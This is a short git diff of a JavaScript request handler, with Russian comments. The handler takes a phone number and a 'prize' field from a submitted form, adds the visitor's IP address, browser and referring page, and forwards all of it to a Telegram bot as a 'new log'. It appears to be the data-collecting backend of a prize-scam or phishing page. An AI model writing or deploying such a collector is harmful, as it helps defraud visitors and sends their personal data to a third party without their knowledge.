@@ -4,16 +4,14 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { phone, prize } = req.body;
+    const { phone, prize } = req.body; // ✅ теперь совпадает
 
-    // Собираем доп. инфу
     const ip =
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket.remoteAddress;
     const ua = req.headers["user-agent"] || "Неизвестно";
     const ref = req.headers["referer"] || "Прямой заход";
 
-    // Формируем сообщение
     const text = `✅ Новый лог
 📞 Номер: ${phone || "—"}
 🎁 Приз: ${prize || "—"}
@@ -22,7 +20,6 @@ export default async function handler(req, res) {
 🖥️ Устройство: ${ua}
 🔗 Источник: ${ref}`;
 
-    // Отправка в Telegram
     await fetch(
       `https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`,
       {
